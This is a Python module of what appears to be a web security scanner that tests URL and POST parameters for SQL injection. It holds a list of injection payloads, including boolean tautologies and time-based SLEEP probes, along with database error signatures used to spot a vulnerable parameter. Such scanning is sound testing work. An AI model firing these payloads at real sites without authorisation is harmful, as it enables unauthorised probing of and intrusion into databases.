"""Falcon MAG Framework - SQL Injection Scanner"""

import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.logger import get_logger

log = get_logger("sqli")

ERROR_SIGNATURES = [
    "SQL syntax", "mysql_fetch", "ORA-01756", "PostgreSQL",
    "SQLite", "Microsoft OLE DB", "ODBC SQL Server",
    "unclosed quotation mark", "You have an error in your SQL",
]

PAYLOADS = [
    ("'", "quote"),
    ("' OR '1'='1", "boolean"),
    ("' OR '1'='2", "boolean"),
    ("1' AND SLEEP(3)-- -", "time"),
    ("1 AND SLEEP(3)", "time"),
]


def _inject(url, param, value):
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))




def _extract_post_params(config):
    """Extract POST body params (form or JSON)."""
    params = []

    post_data = config.get("_post_data", "") or ""
    if post_data:
        try:
            parsed = parse_qs(post_data, keep_blank_values=True)
            for k, v in parsed.items():
                params.append((k, v[0] if v else "", False))
        except Exception:
            pass

    post_json = config.get("_post_json", "") or ""
    if post_json:
        try:
            import json as _json
            data = _json.loads(post_json)
            if isinstance(data, dict):
                for k, v in data.items():
                    params.append((k, str(v), True))
        except Exception:
            pass

    return params


def run(client, config):
    target = config.get("target", "")
    if not target:
        return {"error": "No target"}
    log.info("SQLi check on " + target)
    result = {"target": target, "url": target, "tested": 0, "vulnerable": []}
    parsed = urlparse(target)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        log.info("  No URL parameters to test")
    baseline = client.scan_request(target)
    if not baseline or baseline.status == 0:
        return result
    if qs:
        for param in qs:
            for payload, kind in PAYLOADS:
                result["tested"] += 1
                test_url = _inject(target, param, payload)
                t0 = time.time()
                resp = client.scan_request(test_url)
                elapsed = time.time() - t0
                if not resp:
                    continue
                found = False
                sig_found = ""
                for sig in ERROR_SIGNATURES:
                    if sig.lower() in resp.text.lower():
                        found = True
                        sig_found = sig
                        break
                if kind == "time" and elapsed > 2.5:
                    found = True
                    sig_found = "time-delay " + str(round(elapsed, 2)) + "s"
                if found:
                    log.warning("  SQLi in " + param + " (" + sig_found + ")")
                    result["vulnerable"].append({
                        "url": target,
                        "original_url": target,
                        "injected_url": test_url,
                        "test_url": test_url,
                        "param": param,
                        "payload": payload,
                        "type": kind,
                        "db_error": sig_found,
                        "delay_ms": round(elapsed * 1000, 2),
                        "severity": "critical",
                    })
                    break
    # ==========================================================
    # POST body scanning
    # ==========================================================
    post_params = _extract_post_params(config)
    if post_params:
        log.info("  " + str(len(post_params)) + " POST parameter(s) to test")
        method = "POST"
        post_json_raw = config.get("_post_json", "") or ""
        post_data_raw = config.get("_post_data", "") or ""

        for param_name, orig_value, is_json in post_params:
            for payload, kind in PAYLOADS:
                result["tested"] += 1
                t0 = time.time()
                try:
                    if is_json:
                        import json as _json
                        body = _json.loads(post_json_raw)
                        body[param_name] = payload
                        resp = client.request("POST", target, json=body)
                    else:
                        parsed_data = parse_qs(post_data_raw, keep_blank_values=True)
                        parsed_data[param_name] = [payload]
                        new_body = urlencode(parsed_data, doseq=True)
                        resp = client.request("POST", target, data=new_body)
                except Exception as e:
                    log.debug("POST inject failed: " + str(e))
                    continue
                elapsed = time.time() - t0

                if not resp:
                    continue

                found = False
                sig_found = ""
                for sig in ERROR_SIGNATURES:
                    if sig.lower() in resp.text.lower():
                        found = True
                        sig_found = sig
                        break
                if kind == "time" and elapsed > 2.5:
                    found = True
                    sig_found = "time-delay " + str(round(elapsed, 2)) + "s"

                if found:
                    log.warning("  SQLi (POST) in " + param_name + " (" + sig_found + ")")
                    result["vulnerable"].append({
                        "url": target,
                        "original_url": target,
                        "injected_url": target,
                        "test_url": target,
                        "param": param_name,
                        "payload": payload,
                        "type": kind,
                        "db_error": sig_found,
                        "delay_ms": round(elapsed * 1000, 2),
                        "method": "POST",
                        "severity": "critical",
                    })
                    break

    if not result["vulnerable"]:
        log.info("  No SQLi found (" + str(result["tested"]) + " tested)")
    return result